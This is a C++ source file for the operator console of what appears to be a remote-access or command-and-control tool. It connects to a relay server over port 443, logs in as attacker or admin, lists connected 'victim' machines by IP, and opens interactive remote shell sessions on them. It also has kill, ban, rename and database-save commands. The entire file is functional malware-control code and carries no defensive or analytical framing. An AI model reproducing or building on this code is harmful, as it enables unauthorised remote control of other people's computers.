#include "attacker.hpp"
#include "../commands.hpp"
#include <sstream>

static constexpr uint32_t hash(const std::string s) noexcept {
	uint32_t hash = 5381;
	for (const char* c = s.c_str(); c < s.c_str() + s.size(); ++c)
		hash = ((hash << 5) + hash) + (unsigned char)*c;
	return hash;
}

Attacker::Attacker(std::string inHId, ftxui::Tui& inTui)
	:
	myHId(inHId),
	tui(inTui)
{
	receiveTcpThread = new std::thread([this]() {
		while (true)
			receiveTcp();
		});
}

int Attacker::update()
{
	sf::Clock clock;

	while (tui.server_commands.size() > 0) {
		std::string line = tui.server_commands.front();
		tui.server_commands.pop();

		tui.printServerShell(" > " + line + "\n");

		if (!handleCmd(line))
			return 1;
	}
	while (tui.ssh_commands.size() > 0) {
		if (isSshActive) {
			std::string line = tui.ssh_commands.front();
			tui.ssh_commands.pop();

			//tui.printSshShell(" > " + line + "\n");

			std::stringstream ss(line);
			std::string cmd;
			ss >> cmd;
			//exit ssh session
			if (cmd == "exit") {
				sf::Packet req;
				req << uint16_t(0) << uint8_t(Cmd::END_SSH);
				auto _ = server.send(req);

				isSshActive = false;

				tui.ssh_commands = std::queue<std::string>();
				tui.printSshShell("\n \n ");
			}
			//send ssh data
			else {
				sf::Packet req;
				req << uint16_t(0) << uint8_t(Cmd::SSH_DATA) << line;
				auto _ = server.send(req);
			}
		}
		else {
			tui.ssh_commands = std::queue<std::string>();
			tui.printSshShell("ssh is not active\n");
		}
	}
	
	while (packetsToProcess.size() > 0) {
		handlePacket(packetsToProcess[0]);
		packetsToProcess.erase(packetsToProcess.begin());
	}

	//set to ~10 fps
	auto passed = clock.getElapsedTime().asMicroseconds();
	if (passed < 100'000) 
		sf::sleep(sf::microseconds(100'000 - passed));

	return 0;
}

void Attacker::receiveTcp()
{
	sf::Packet p;
	auto status = server.receive(p);

	//update initialization status
	if (status == sf::Socket::Status::Disconnected) {
		if (isInitialized) {
			isInitialized = false;
			isAdmin = false;
			isSshActive = false;

			tui.clients_overview_output = "Server connection required";
			tui.server_database_output = "Server connection and admin privileges required";
			tui.info_title = ftxui::text("Not connected") | ftxui::color(ftxui::Color::Red);
			tui.triggerRedraw();
		}
		sf::sleep(sf::milliseconds(100));
	}
	if (status == sf::Socket::Status::Error)
		sf::sleep(sf::milliseconds(100));
	if (status != sf::Socket::Status::Done)
		return;

	uint16_t reqId;
	p >> reqId;

	if (reqId == uint16_t(0))
		packetsToProcess.push_back(p);
	else
		responsesToProcess[reqId] = p;
}

void Attacker::connectServer(std::stringstream& ss, bool pw)
{
	isInitialized = false;
	isAdmin = false;
	isSshActive = false;
	server.disconnect();

	tui.clients_overview_output = "Server connection required";
	tui.server_database_output = "Server connection and admin privileges required";
	tui.info_title = ftxui::text("Not connected") | ftxui::color(ftxui::Color::Red);
	tui.triggerRedraw();

	std::string ipStr;
	short port = 0;
	ss >> ipStr >> port;
	if (port == 0)
		port = 443;

	//retrieve the ip and port from the interface string
	//if no port is provided, default to 443
	if (ipStr.find_first_of(':') != std::string::npos) {
		auto pos = ipStr.find_first_of(':');
		try {
			port = std::stoi(ipStr.substr(pos + 1));
		}
		catch (const std::invalid_argument&) {
			tui.printServerShell("port provided is not valid\n");
			return;
		}
		ipStr = ipStr.substr(0, pos);
	}

	//parse the ip address
	auto ip = sf::IpAddress::resolve(ipStr);
	if (!ip.has_value()) {
		tui.printServerShell("ip address provided is not valid\n");
		return;
	}
	serverIp = ip.value();

	//connect to the server
	if (server.connect(serverIp, port) != sf::Socket::Status::Done) {
		tui.printServerShell("failed to connect to server\n");
		return;
	}

	//take password input from the user (if admin)
	std::string password = "";
	if (pw) {
		tui.printServerShell("enter the password: ");
		while (true) {
			if (tui.server_commands.size() < 1) {
				sf::sleep(sf::milliseconds(100));
				continue;
			}

			password = tui.server_commands.front();
			tui.server_commands.pop();
			tui.printServerShell(std::string(password.size(), '*') + "\n");
			break;
		}
	}

	//send the registration request
	sf::Packet req;
	uint16_t reqId = requestId++;
	auto cmd = (pw) ? Cmd::REGISTER_ADMIN : Cmd::REGISTER_ATTACKER;
	req << reqId << std::uint8_t(cmd) << myHId;
	if (pw)
		req << password;
	if (server.send(req) != sf::Socket::Status::Done) {
		tui.printServerShell("failed to send registration request\n");

		server.disconnect();
		return;
	}

	//wait for initialization response and output progress
	tui.printServerShell("waiting for response: [");
	for (int i = 0; i < 10; i++) {
		if (responsesToProcess.find(reqId) == responsesToProcess.end()) {
			sf::sleep(sf::milliseconds(500));
			tui.printServerShell("*");
		}
		else
			tui.printServerShell(".");
	}
	tui.printServerShell("] - ");

	//initialization wasn't successful
	if (responsesToProcess.find(reqId) == responsesToProcess.end()) {
		tui.printServerShell("timed out\n");

		server.disconnect();
		return;
	}
	
	sf::Packet res = responsesToProcess[reqId];
	responsesToProcess.erase(reqId);

	bool success = false;
	res >> success;
	if (!success) {
		if (pw)
			tui.printServerShell("failed admin login\n");
		else
			tui.printServerShell("you are banned :(\n");

		server.disconnect();
		return;
	}

	res >> myId;
	isInitialized = true;
	isAdmin = pw;

	std::string add = server.getRemoteAddress().value().toString() + ":" + std::to_string(server.getRemotePort());
	tui.info_title = ftxui::text("Connected to " + add) | ftxui::color(ftxui::Color::Green);
	tui.triggerRedraw();

	if (pw)
		tui.printServerShell("admin access granted (" + std::to_string(myId) + ")\n");
	else
		tui.printServerShell("initialized (" + std::to_string(myId) + ")\n");
}

bool Attacker::handleCmd(const std::string& s)
{
	std::stringstream ss(s);
	std::string cmd;
	ss >> cmd;

	//TODO: process command only if correct number of arguments is provided
	//TODO: add help command

	switch (hash(cmd)) {
	case hash("exit"): {
		return false;
		break;
	}
	case hash("clear"): {
		tui.server_shell_output = "";
		tui.triggerRedraw();
		break;
	}
	case hash("connect"): {
		connectServer(ss, false);
		break;
	}
	case hash("adminconnect"): {
		connectServer(ss, true);
		break;
	}
	case hash("name"): {
		if (!isInitialized) {
			tui.printServerShell("client is not initialized\n");
			break;
		}
		else if (!isAdmin) {
			tui.printServerShell("admin privileges are needed\n");
			break;
		}

		std::string oHId, name;
		ss >> oHId >> name;
		if (oHId.empty() || name.empty()) {
			tui.printServerShell("invalid arguments\n");
			break;
		}

		sf::Packet req;
		req << uint16_t(0) << uint8_t(Cmd::CHANGE_NAME) << oHId << name;
		if (server.send(req) != sf::Socket::Status::Done)
			tui.printServerShell("failed to send request to server\n");
		break;
	}
	case hash("ban"): {
		if (!isInitialized) {
			tui.printServerShell("client is not initialized\n");
			break;
		}
		else if (!isAdmin) {
			tui.printServerShell("admin privileges are needed\n");
			break;
		}

		std::string oHId;
		ss >> oHId;
		if (oHId.empty()) {
			tui.printServerShell("invalid arguments\n");
			break;
		}

		sf::Packet req;
		req << uint16_t(0) << uint8_t(Cmd::BAN_HID) << oHId;
		if (server.send(req) != sf::Socket::Status::Done)
			tui.printServerShell("failed to send request to server\n");
		break;
	}
	case hash("unban"): {
		if (!isInitialized) {
			tui.printServerShell("client is not initialized\n");
			break;
		}
		else if (!isAdmin) {
			tui.printServerShell("admin privileges are needed\n");
			break;
		}

		std::string oHId;
		ss >> oHId;
		if (oHId.empty()) {
			tui.printServerShell("invalid arguments\n");
			break;
		}

		sf::Packet req;
		req << uint16_t(0) << uint8_t(Cmd::UNBAN_HID) << oHId;
		if (server.send(req) != sf::Socket::Status::Done)
			tui.printServerShell("failed to send request to server\n");
		break;
	}
	case hash("kill"): {
		if (!isInitialized) {
			tui.printServerShell("client is not initialized\n");
			break;
		}
		else if (!isAdmin) {
			tui.printServerShell("admin privileges are needed\n");
			break;
		}

		uint16_t oId = uint16_t(0);
		ss >> oId;
		if (oId == uint16_t(0)) {
			tui.printServerShell("invalid arguments\n");
			break;
		}

		sf::Packet req;
		req << uint16_t(0) << uint8_t(Cmd::KILL) << oId;
		if (server.send(req) != sf::Socket::Status::Done)
			tui.printServerShell("failed to send request to server\n");
		break;
	}
	case hash("ssh"): {
		if (!isInitialized) {
			tui.printServerShell("client is not initialized\n");
			break;
		}

		uint16_t oId = uint16_t(0);
		ss >> oId;
		if (oId == uint16_t(0)) {
			tui.printServerShell("invalid arguments\n");
			break;
		}

		sf::Packet req;
		uint16_t reqId = requestId++;
		req << uint16_t(reqId) << uint8_t(Cmd::START_SSH) << oId;
		if (server.send(req) != sf::Socket::Status::Done)
			tui.printServerShell("failed to send request to server\n");

		tui.printServerShell("waiting for response: [");
		for (int i = 0; i < 10; i++) {
			if (responsesToProcess.find(reqId) == responsesToProcess.end()) {
				tui.printServerShell("*");
				sf::sleep(sf::milliseconds(500));
			}
			else
				tui.printServerShell(".");
		}
		tui.printServerShell("] - ");

		if (responsesToProcess.find(reqId) == responsesToProcess.end()) {
			tui.printServerShell("timed out\n");
			break;
		}

		sf::Packet res = responsesToProcess[reqId];
		responsesToProcess.erase(reqId);

		//1 = success, 2 = already paired, 3 = invalid id
		//4 = other id already paired
		uint8_t code = 0;
		res >> code;
		if (code == 1) {
			tui.ssh_shell_output = "";
			tui.shell_tab_selected = 1;

			tui.printServerShell("loading ssh session...\n");
			isSshActive = true;
		}
		else if (code == 2)
			tui.printServerShell("ssh session already active\n");
		else if (code == 3)
			tui.printServerShell("invalid victim id\n");
		else if (code == 4)
			tui.printServerShell("victim occupied\n");
		else
			tui.printServerShell("unknown error\n");

		break;
	}
	case hash("save"): {
		if (!isInitialized) {
			tui.printServerShell("client is not initialized\n");
			break;
		}
		else if (!isAdmin) {
			tui.printServerShell("admin privileges are needed\n");
			break;
		}

		sf::Packet req;
		uint16_t reqId = requestId++;
		req << uint16_t(reqId) << uint8_t(Cmd::SAVE_DATASET);
		if (server.send(req) != sf::Socket::Status::Done)
			tui.printServerShell("failed to send request to server\n");

		tui.printServerShell("waiting for response: [");
		for (int i = 0; i < 10; i++) {
			if (responsesToProcess.find(reqId) == responsesToProcess.end()) {
				tui.printServerShell("*");
				sf::sleep(sf::milliseconds(500));
			}
			else
				tui.printServerShell(".");
		}
		tui.printServerShell("] - ");

		if (responsesToProcess.find(reqId) == responsesToProcess.end()) {
			tui.printServerShell("request timed out\n");
			break;
		}
		else
			tui.printServerShell("saved database\n");

		break;
	}
	case hash(""): break;
	default: {
		tui.printServerShell("enter a valid command\n");
		break;
	}
	}

	return true;
}

void Attacker::handlePacket(sf::Packet& p)
{	
	uint8_t cmd;
	p >> cmd;

	if (cmd == uint8_t(Cmd::CLIENTS_UPDATE))
		updateList(p);
	else if (cmd == uint8_t(Cmd::END_SSH)) {
		isSshActive = false;
		tui.triggerRedraw();
	}
	else if (cmd == uint8_t(Cmd::SSH_DATA)) {
		if (!isSshActive)
			return;

		std::string data;
		p >> data;

		tui.printSshShell(data);
	}
}

void Attacker::updateList(sf::Packet& p)
{
	uint16_t dbSize, clientsSize;

	p >> dbSize;
	//database is only sent to admins
	if (dbSize > 0 || isAdmin) {
		std::stringstream ss_database("");
		for (int i = 0; i < dbSize; i++) {
			std::string oHId = "", name = "";
			bool ban = false;
			p >> oHId >> name >> ban;
			ss_database << "- " << oHId << " (" << name << "): ";
			if (ban)
				ss_database << "banned\n";
			else
				ss_database << "not banned\n";
		}
		tui.server_database_output = ss_database.str();
	}
	else if (isInitialized)
		tui.server_database_output = "Admin privileges required";

	p >> clientsSize;
	std::stringstream ss_clients("");
	for (int i = 0; i < clientsSize; i++) {
		std::string oHId = "", ip = "";
		uint16_t id = 0;
		bool att = false, adm = false;
		p >> oHId >> ip >> id >> att >> adm;

		ss_clients << "- " << oHId << " (" << id << "): ";
		if (adm)
			ss_clients << "admin - " << ip;
		else if (att)
			ss_clients << "attacker - " << ip;
		else
			ss_clients << "victim - " << ip;

		ss_clients << "\n";
	}
	tui.clients_overview_output = ss_clients.str();
	tui.triggerRedraw();
}
